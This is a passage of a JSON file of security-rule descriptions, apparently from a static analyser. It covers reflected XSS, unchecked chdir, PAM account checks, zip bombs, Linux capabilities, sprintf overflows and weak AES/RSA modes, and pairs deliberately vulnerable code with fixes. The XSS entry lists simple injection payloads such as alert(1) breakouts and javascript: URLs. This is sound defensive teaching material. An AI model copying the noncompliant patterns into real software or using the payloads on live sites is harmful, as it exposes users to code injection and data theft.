        "name": "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks",
        "htmlDesc": "<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent user’s data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in JSP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because JSP does not auto-escape variables.</p>\n<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. This can be done with the <a\nhref=\"https://owasp.org/www-project-java-encoder/\">OWASP Java Encoder</a> or similar libraries.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n&lt;%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%&gt;\n&lt;%@taglib prefix=\"e\" uri=\"https://www.owasp.org/index.php/OWASP_Java_Encoder_Project\" %&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n &lt;body&gt;\n  &lt;h1&gt;${param.title}&lt;/h1&gt;    &lt;!-- Noncompliant --&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n&lt;%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%&gt;\n&lt;%@taglib prefix=\"e\" uri=\"https://www.owasp.org/index.php/OWASP_Java_Encoder_Project\" %&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n &lt;body&gt;\n  &lt;h1&gt;${e:forHtml(param.title)}&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h3>How does this work?</h3>\n<p>Template engines are used by web applications to build HTML content. Template files contain static HTML as well as template language instruction.\nThese instructions allow, for example, to insert dynamic values into the document as the template is rendered.</p>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end user’s point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; → &amp;amp; </li>\n          <li> &lt; → &amp;lt; </li>\n          <li> &gt; → &amp;gt; </li>\n          <li> \" → &amp;quot; </li>\n          <li> ' → &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; → &amp;amp; </li>\n          <li> &lt; → &amp;lt; </li>\n          <li> &gt; → &amp;gt; </li>\n          <li> \" → &amp;quot; </li>\n          <li> ' → &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<p><code>org.owasp.encoder.Encode.forHtml</code> is the recommended method to encode HTML entities.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n  <li> <a href=\"https://javadoc.io/doc/org.owasp.encoder/encoder/latest/index.html\">OWASP Encoder</a> </li>\n  <li> <a href=\"https://spring.io/guides/gs/securing-web/\">Spring.io, Securing a Web Application</a> </li>\n  <li> <a href=\"https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html\">Thymeleaf.org, Tutorial: Using Thymeleaf</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> <a href=\"https://samy.pl/myspace/\">Samy Kamkar, The MySpace Worm</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "c:S5982": {
        "name": "Changing working directories without verifying the success is security-sensitive",
        "htmlDesc": "<p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the\nworking directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success\nof chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The success of changing the working directory is relevant for the application. </li>\n  <li> Changing the working directory is required by chroot to make the new root effective. </li>\n  <li> Subsequent disk operations are using relative paths. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>After changing the current working directory verify the success of the operation and handle errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>\n<pre>\nconst char* any_dir = \"/any/\";\nchdir(any_dir); // Sensitive: missing check of the return value\n\nint fd = open(any_dir, O_RDONLY | O_DIRECTORY);\nfchdir(fd); // Sensitive: missing check of the return value\n</pre>\n<h2>Compliant Solution</h2>\n<p>Verify the return code of <code>chdir</code> and handle errors:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nif (chdir(root_dir) == -1) {\n  exit(-1);\n} // Compliant\n\nint fd = open(any_dir, O_RDONLY | O_DIRECTORY);\nif(fchdir(fd) == -1) {\n  exit(-1);\n} // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/252\">CWE-252 - Unchecked Return Value</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chdir.2.html\">man7.org</a> - chdir </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5832": {
        "name": "Account validity should be verified when authenticating users with PAM",
        "htmlDesc": "<p>Pluggable authentication module (PAM) is a mechanism used on many UNIX variants to provide a unified way to authenticate users, independently of\nthe underlying authentication scheme.</p>\n<h2>Why is this an issue?</h2>\n<p>When authenticating users, if the validity of the account is not checked (not locked, not expired …​), it may lead to unauthorized access to\nresources.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint valid(pam_handle_t *pamh) {\n    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) { // Noncompliant\n        return -1;\n    }\n\n    return 0;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint valid(pam_handle_t *pamh) {\n    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) {\n        return -1;\n    }\n    if (pam_acct_mgmt(pamh, 0) != PAM_SUCCESS) {\n        return -1;\n    }\n\n    return 0;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The account validity is checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> The Open Group - <a href=\"https://pubs.opengroup.org/onlinepubs/8329799/pam_acct_mgmt.htm\"><code>pam_acct_mgmt</code></a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Packt hub - <a href=\"https://hub.packtpub.com/development-pluggable-authentication-modules-pam/\">Development with Pluggable Authentication\n  Modules (PAM)</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/304\">CWE-304 - Missing Critical Step in Authentication</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;archive.h&gt;\n#include &lt;archive_entry.h&gt;\n// ...\n\nvoid f(const char *filename, int flags) {\n  struct archive_entry *entry;\n  struct archive *a = archive_read_new();\n  struct archive *ext = archive_write_disk_new();\n  archive_write_disk_set_options(ext, flags);\n  archive_read_support_format_tar(a);\n\n  if ((archive_read_open_filename(a, filename, 10240))) {\n    return;\n  }\n\n  for (;;) {\n    int r = archive_read_next_header(a, &amp;entry);\n    if (r == ARCHIVE_EOF) {\n      break;\n    }\n    if (r != ARCHIVE_OK) {\n      return;\n    }\n  }\n  archive_read_close(a);\n  archive_read_free(a);\n\n  archive_write_close(ext);\n  archive_write_free(ext);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;archive.h&gt;\n#include &lt;archive_entry.h&gt;\n// ...\n\nint f(const char *filename, int flags) {\n  const int max_number_of_extraced_entries = 1000;\n  const int64_t max_file_size = 1000000000; // 1 GB\n\n  int number_of_extraced_entries = 0;\n  int64_t total_file_size = 0;\n\n  struct archive_entry *entry;\n  struct archive *a = archive_read_new();\n  struct archive *ext = archive_write_disk_new();\n  archive_write_disk_set_options(ext, flags);\n  archive_read_support_format_tar(a);\n  int status = 0;\n\n  if ((archive_read_open_filename(a, filename, 10240))) {\n    return -1;\n  }\n\n  for (;;) {\n    number_of_extraced_entries++;\n    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {\n      status = 1;\n      break;\n    }\n\n    int r = archive_read_next_header(a, &amp;entry);\n    if (r == ARCHIVE_EOF) {\n      break;\n    }\n    if (r != ARCHIVE_OK) {\n      status = -1;\n      break;\n    }\n\n    int file_size = archive_entry_size(entry);\n    total_file_size += file_size;\n    if (total_file_size &gt; max_file_size) {\n      status = 1;\n      break;\n    }\n  }\n  archive_read_close(a);\n  archive_read_free(a);\n\n  archive_write_close(ext);\n  archive_write_free(ext);\n\n  return status;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5849": {
        "name": "Setting capabilities is security-sensitive",
        "htmlDesc": "<p>Setting capabilities can lead to privilege escalation.</p>\n<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to files or processes. A thread with capabilities bypasses\nthe normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root\nprivileges.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Capabilities are granted:</p>\n<ul>\n  <li> To a process that does not require all capabilities to do its job. </li>\n  <li> To a not trusted process. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary\ncapabilities are assigned to files and processes.</p>\n<h2>Sensitive Code Example</h2>\n<p>When setting capabilities:</p>\n<pre>\ncap_t caps = cap_init();\ncap_value_t cap_list[2];\ncap_list[0] = CAP_FOWNER;\ncap_list[1] = CAP_CHOWN;\ncap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);\n\ncap_set_file(\"file\", caps); // Sensitive\ncap_set_fd(fd, caps); // Sensitive\ncap_set_proc(caps); // Sensitive\ncapsetp(pid, caps); // Sensitive\ncapset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call\n</pre>\n<p>When setting SUID/SGID attributes:</p>\n<pre>\nchmod(\"file\", S_ISUID|S_ISGID); // Sensitive\nfchmod(fd, S_ISUID|S_ISGID); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522\">False Boundaries and Arbitrary Code Execution</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man7/capabilities.7.html\">Linux manual page</a> - capabilities(7) </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S6069": {
        "name": "\"sprintf\" should not be used",
        "htmlDesc": "<p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer\noverflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be\nexecuted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format\n  strings and all possible additional arguments). </li>\n</ul>\n<p>There is a risk if you answered no to the above question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,\npreventing the function from overflowing the buffer.</p>\n<ul>\n  <li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.\n  </li>\n  <li> Check the buffer size passed to <code>snprintf</code>. </li>\n</ul>\n<p>If you are working in C++, other safe alternative exist:</p>\n<ul>\n  <li> <code>std::string</code> should be the prefered type to store strings </li>\n  <li> You can format to a string using <code>std::ostringstream</code> </li>\n  <li> Since C++20, <code>std::format</code> is also available to format strings </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsprintf(str, \"%s\", message);   // Sensitive: `str` buffer size is not checked and it is vulnerable to overflows\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsnprintf(str, sizeof(str), \"%s\", message); // Prevent overflows by enforcing a maximum size for `str` buffer\n</pre>\n<h2>Exceptions</h2>\n<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments\ninto an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note\nthat 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>\n<pre>\nsize_t buflen = snprintf(0, 0, \"%s\", message);\nchar* buf = malloc(buflen + 1); // For the final 0\nsprintf(buf, \"%s\", message);{code}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/ECB\", Botan::ENCRYPTION); // Noncompliant\n}\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n#include &lt;botan/pubkey.h&gt;\n\nvoid encrypt() {\n  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);\n  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);\n\n  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), \"PKCS1v15\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/GCM\", Botan::ENCRYPTION);\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n#include &lt;botan/pubkey.h&gt;\n\nvoid encrypt() {\n  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);\n  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);\n\n  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), \"OAEP\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a 